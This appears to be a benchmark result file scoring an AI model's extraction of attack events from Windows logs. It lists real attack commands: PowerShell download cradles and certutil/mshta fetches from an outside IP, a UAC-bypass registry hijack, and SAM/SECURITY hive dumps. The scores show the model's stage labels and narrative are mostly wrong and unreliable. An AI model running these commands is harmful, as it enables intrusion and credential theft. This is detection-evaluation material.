@@ -1,0 +1,150 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "reg.exe add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /t REG_DWORD /d 0 /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Folder\\shell\\open\\command\" /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg.exe add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command\" /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg.exe add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command\" /v DelegateExecute /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg.exe add \"HKEY_CURRENT_USER\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command\" /v DelegateExecute /f",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /C \\\"T1059.006.py\\\", reg.exe save hklm\\security c:\\users\\administrator\\appdata\\local\\temp\\tjbvkjpetfjp",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /C \\\"T1059.006.py\\\", reg.exe save hklm\\system c:\\users\\administrator\\appdata\\local\\temp\\qsdirkg",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /C \\\"T1059.006.py\\\", reg.exe save hklm\\sam c:\\users\\administrator\\appdata\\local\\temp\\tthwwf",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \\\"cscript C:\\AtomicRedTeam\\atomics\\T1059.005\\src\\sys_info.vbs > \\$env:TEMP\\T1059.005.out.txt\\\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "wermgr.exe -purgestores",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v verifierdlls /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Collection"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C 'Invoke-WebRequest http://124.223.85.207:8082/test.hta -Method POST', 'C:\\Users\\Administrator\\Desktop\\shell\\T1059.006.py'",
+        "stage": "Collection"
+      },
+      {
+        "command": "wermgr.exe -purgestores",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C 'certutil.exe -encode a.txt b.txt'",
+        "stage": "Collection"
+      },
+      {
+        "command": "del /f /q b.txt ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "Add-Content -Path '\\\\?\\UNC\\\\C\\\\Users\\\\Administrator\\\\AppData\\\\Roaming\\\\victim.txt' -Value '\\\\?\\UNC\\\\C\\\\Users\\\\Administrator\\\\AppData\\\\Roaming\\\\output.txt'",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C 'net stop wuauserv; net start wuauserv'",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd.exe /C 'systeminfo' ",
+        "stage": "Discovery"
+      }
+    ],
+    "narrative": "The attacker first used PowerShell scripts to download malware from an external server. They then created files and registry keys persistently to enable future access. The attacker executed various commands using the built-in tools like `certutil` and `reg`. They also created shortcuts to execute arbitrary code when certain actions were performed. In addition, they exploited vulnerabilities in the browser to elevate privileges.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 125106,
+      "completion_tokens": 11227,
+      "total_tokens": 136333,
+      "wall_clock_s": 143.295,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.04,
+      "recall": 0.043478260869565216,
+      "f1": 0.041666666666666664,
+      "tp": 1,
+      "fp": 24,
+      "fn": 22
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 25,
+      "fn": 23,
+      "recall_partial": 0.021739130434782608
+    },
+    "hallucination_rate": 0.16666666666666666,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 125106,
+      "completion_tokens": 11227,
+      "total_tokens": 136333,
+      "wall_clock_s": 143.295,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v2_maxtok4096",
+    "max_tokens": 4096,
+    "prompt_variant": "base",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
